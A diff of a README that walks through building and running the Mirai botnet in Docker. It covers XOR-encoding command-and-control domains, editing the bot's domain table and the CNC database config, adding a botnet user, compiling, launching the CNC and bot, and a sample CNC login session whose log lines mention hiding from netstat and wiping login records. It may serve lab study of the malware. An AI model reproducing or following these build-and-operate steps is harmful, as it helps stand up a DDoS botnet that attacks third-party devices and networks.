@@ -2,33 +2,33 @@
 
 https://github.com/jgamblin/Mirai-Source-Code
 
-### Install docker and docker compose
+## 01. Install docker and docker compose
 https://docs.docker.com/get-docker/
 
-### Download source and dockerfile
+## 02. Clone repository
 ```
-git clone https://github.com/deunlee/Mirai-Docker
-cd Mirai-Docker
-```
-
-### Build docker containers
-```
-docker compose build
+$ git clone https://github.com/deunlee/Mirai-Docker
+$ cd Mirai-Docker
 ```
 
-### Encrypt your domain
+## 03. Build docker containers
 ```
-docker compose run compile ./enc.sh string cnc.mirai.com
+$ docker compose build
+```
+
+## 04. Encrypt your domain
+```
+$ docker compose run compile ./enc.sh string cnc.mirai.com
 XOR'ing 14 bytes of data...
 \x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
 ```
 ```
-docker compose run compile ./enc.sh string report.mirai.com
+$ docker compose run compile ./enc.sh string report.mirai.com
 XOR'ing 17 bytes of data...
 \x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
 ```
 
-### Configuring bot
+## 05. Configure bot
 Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
 ```c
 add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 30); // cnc.mirai.com
@@ -53,7 +53,7 @@ struct resolv_entries *resolv_lookup(char *domain)
 }
 ```
 
-### Configuring CNC
+## 06. Configure CNC
 Edit database config in [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
 ```go
 const DatabaseAddr string   = "mariadb" // "127.0.0.1"
@@ -81,30 +81,58 @@ CREATE TABLE `history` (
 INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, ''); --- here!
 ```
 
-### Compile bot and CNC
+## 07. Compile bot and CNC
 ```
-docker compose run compile ./build.sh
+$ docker compose run compile ./build.sh
 ```
 
-### Run CNC and database server
+## 08. Run CNC and database server
 ```
-docker compose up mariadb -d
-docker compose run compile sudo ./src/mirai/debug/cnc
-docker compose exec compile telnet 127.0.0.1
+$ docker compose up
 ```
-telnet 127.0.0.1
+```
+$ telnet 127.0.0.1
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+я люблю куриные наггетсы
+пользователь: mirai-user
+пароль: **********
+
+проверив счета... |
+[+] DDOS | Succesfully hijacked connection
+[+] DDOS | Masking connection from utmp+wtmp...
+[+] DDOS | Hiding from netstat...
+[+] DDOS | Removing all traces of LD_PRELOAD...
+[+] DDOS | Wiping env libc.poison.so.1
+[+] DDOS | Wiping env libc.poison.so.2
+[+] DDOS | Wiping env libc.poison.so.3
+[+] DDOS | Wiping env libc.poison.so.4
+[+] DDOS | Setting up virtual terminal...
+[!] Sharing access IS prohibited!
+[!] Do NOT share your credentials!
+Ready
+mirai-user@botnet#
+```
 
 <!--
-### Connect database for test
 ```
-docker compose run compile
+$ docker compose run compile
 mysql -h mariadb -P 3306 -u"user" -p"this-is-password!"
 use mirai;
 select * from users;
 ```
+
+```
+$ docker compose up mariadb -d
+$ docker compose run compile sudo ./src/mirai/debug/cnc
+```
+```
+$ docker compose exec compile telnet 127.0.0.1
+```
 -->
 
-### Run bot
+## 09. Run bot
 ```
-docker compose run compile ./src/mirai/debug/mirai.dbg
+$ docker compose run compile ./src/mirai/debug/mirai.dbg
 ```
